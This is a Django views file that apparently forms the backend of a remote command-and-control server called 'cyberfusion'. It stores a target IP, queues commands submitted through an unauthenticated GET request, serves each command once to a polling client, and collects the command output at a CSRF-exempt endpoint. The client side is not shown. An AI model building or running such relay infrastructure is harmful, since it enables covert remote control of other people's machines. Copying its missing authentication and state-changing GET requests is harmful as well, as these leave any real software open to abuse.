from django.shortcuts import render, redirect
from .models import Command, Output, IpAddress
from django.http import JsonResponse
import time
from django.views.decorators.csrf import csrf_exempt
from .tasks import runCyberFusion

# Create your views here.
#celery -A cyberfusion.celery worker -l info
# pip install eventlet
# celery -A cyberfusion.celery worker -l info -P eventlet
def index(request):

    runCyberFusion.delay()
    return render(request,'form.html')

########## IP ##############
def save_ip(request):

    if request.method == "POST":
        i = request.POST.get('input_data')
        if i:
            ip = IpAddress.objects.create(ip = i)
            ip.save()
            return redirect('index')
    return render(request,'index.html')

def get_ip(request):
    ip = IpAddress.objects.all().last()
    data = {'ip': 'NoIpFound'}
    if ip:
        data = {'ip': f'{ip.ip}'}
    return JsonResponse(data)


########## COMMAND ##############

def save_command(request):
    c = request.GET.get('command')
    if c:
        cmd = Command.objects.create(command = c)
        cmd.save()
        return JsonResponse({"message": "command sent sucessfully"})
    return JsonResponse({"error": "command not in data"})


def get_command(request):
    try:
        cmd = Command.objects.all()[0]
        command = cmd.command
        data = {'command': f'{command}'}
        cmd.delete()
        return JsonResponse(data)
    except:
        return JsonResponse({'command': "ErrorNoCommand"})


########## OUTPUT ##############

@csrf_exempt
def send_output(request):
    if request.method == 'POST':
        output = request.POST.get('output')
        if output:
            op = Output.objects.create(output=output)
            op.save()
            return JsonResponse({'message': 'output sent!'})
        return JsonResponse({'error': 'Blank message sent'})
    else:
        return JsonResponse({'error': 'Only POST requests are allowed'})
    
def get_output(request):
    try:
        op = Output.objects.all().first()
        output = op.output
        data = {'output': f'{output}'}
        op.delete()
        return JsonResponse(data)
    except:
        return JsonResponse({'output': "ErrorNoOutput"})
